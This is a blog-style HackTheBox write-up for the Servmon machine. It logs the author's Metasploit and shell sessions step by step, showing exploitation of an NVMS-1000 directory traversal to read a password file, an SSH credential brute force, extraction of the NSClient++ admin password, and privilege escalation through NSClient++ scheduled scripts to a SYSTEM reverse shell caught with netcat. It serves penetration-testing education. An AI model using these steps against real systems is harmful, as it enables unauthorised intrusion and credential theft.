---
layout: post
title: Hackthebox - Write up of Servmon machine
lang: en
description: Hackthebox - Write up of Servmon machine
tags: linux kali pentest nvms1000 ftp nsclient msf metasploit
comments: true
--- 

This time, let's try to get root on Servmon machine from Hackthebox. 

Standard starting procedure: NMAP. 

{% highlight bash %}
$ nmap -T4 10.10.10.184
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-29 20:10 EDT
Nmap scan report for 10.10.10.184 (10.10.10.184)
Host is up (0.22s latency).
Not shown: 992 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5666/tcp open  nrpe
6699/tcp open  napster

Nmap done: 1 IP address (1 host up) scanned in 124.70 seconds
{% endhighlight %}


Opening website as that has given good results while nmap runs again with -A.

It seems there is a software called NVMS-1000 running there. Let's google and see what that is about. On this search we can see it is vulnerable to a directory traversal. https://www.exploit-db.com/exploits/48311

Keep this in mind and let's take a look on ftp.

<!--more-->

{% highlight bash %}
$ ftp 10.10.10.184 
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nadine
250 CWD command successful.
ftp> dir
200 PORT command successful.
get 125 Data connection already open; Transfer starting.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 1.04 secs (0.1635 kB/s)
ftp> cd ..
250 CWD command successful.
ftp> cd Nathan
dir
250 CWD command successful.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
01-18-20  12:10PM                  186 Notes to do.txt
226 Transfer complete.
ftp> get 'Notes to do.txt'
local: to remote: 'Notes
200 PORT command successful.
550 The system cannot find the file specified. 
ftp> get "Notes to do.txt"
local: Notes to do.txt remote: Notes to do.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
186 bytes received in 1.02 secs (0.1778 kB/s)
ftp> 
{% endhighlight %}
 

Checking file content:
{% highlight bash %}
$ cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint

$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
{% endhighlight %} 

OK. This sounds promising if we connect the traversal with this Password path hint we might be able to access the files. Lets use msfconsole

{% highlight bash %}
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > search nvms

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/tvt_nvms_traversal  2019-12-12       normal  No     TVT NVMS-1000 Directory Traversal


msf5 auxiliary(scanner/http/tvt_nvms_traversal) > use 0
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set rhosts 10.10.10.184
rhosts => 10.10.10.184
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set FILEPATH /Users/Nathan/Desktop/Passwords.txt
FILEPATH => /Users/Nathan/Desktop/Passwords.txt
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > run

[+] 10.10.10.184:80 - Downloaded 156 bytes
[+] File saved in: /home/kali/.msf4/loot/20200519201005_default_10.10.10.184_nvms.traversal_218286.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > 
{% endhighlight %}


Checking the file content:

{% highlight bash %}
$ cat /home/kali/.msf4/loot/20200519201005_default_10.10.10.184_nvms.traversal_218286.txt
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
{% endhighlight %}

That's a possible list of passwords I believe. We have two possible users:
{% highlight bash %}
nadine
nathan
{% endhighlight %}

With this password list, so we can use msfconsole with ssh_login to try them:

{% highlight bash %}
msf5 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


msf5 > use 0
msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 10.10.10.184
rhosts => 10.10.10.184
msf5 auxiliary(scanner/ssh/ssh_login) > set user_file users.txt
user_file => users.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set pass_file passwords.txt
pass_file => passwords.txt
msf5 auxiliary(scanner/ssh/ssh_login) > run

[+] 10.10.10.184:22 - Success: 'nadine:L1k3B1gBut7s@W0rk' ''
[*] Command shell session 1 opened (10.10.16.87:44279 -> 10.10.10.184:22) at 2020-05-19 20:14:31 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) > 
{% endhighlight %}


It found a valid credential. Perfect, lets access it on ssh. Keep in mind to always do some enumeration and look what exists on machine and what config it does have. If a service doesnt sound promising, check google and config. With this approach we can find
C:\Program Files\NSClient++\nsclient.ini

It has an interesting part

{% highlight ini %}
; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1

; Undocumented key
WEBServer = enabled
{% endhighlight %}


After some more googling we can find out that WEBServer for NSClient by default listen on port 8443 so creating a tunnel which allow our localhost to access the other machine ip on that port with:

{% highlight bash %}
$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
{% endhighlight %}

And open the website on my chrome instance. We can also see there is a Priv Esc for NSClient++ on https://www.exploit-db.com/exploits/46802
Usually this machines doesn't need reboot but let's try to follow the process more or less. It seems the machine is not that stable but after a few tries I was able to connect to 8443 and login.

{% highlight %}
Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
  - section: /settings/external scripts/scripts/foobar
  - key: command
  - value: c:\temp\evil.bat

Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
  - section: /settings/scheduler/schedules/foobar
  - key: interval
  - value: 1m
  - key: command
  - value: foobar
{% endhighlight %}

This was a bit painful to run, it didn' t start automatically but when I opened: Console I saw a bunch of messages like:

{% highlight %}
Unknown command(s): foobar available commands: commands {, alias_cpu, alias_cpu_ex, alias_disk, alias_disk_loose, alias_event_log, alias_file_age, alias_file_size, alias_mem, alias_process, alias_process_count, alias_process_hung, alias_process_stopped, alias_sched_all, alias_sched_long, alias_sched_task, alias_service, alias_service_ex, alias_up, alias_volumes, alias_volumes_loose, check_tasksched, checktasksched, foobar}, plugins {, 0, 1}
{% endhighlight %}

so I tried to call foobar directly and... I got a root shell on nc

{% highlight bash %}
$ sudo nc -nlvvp 2443
[sudo] password for kali: 
listening on [any] 2443 ...
whoami

connect to [10.10.16.87] from (UNKNOWN) [10.10.10.184] 50557
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
nt authority\system
{% endhighlight %}

Hope you had fun,
Matheus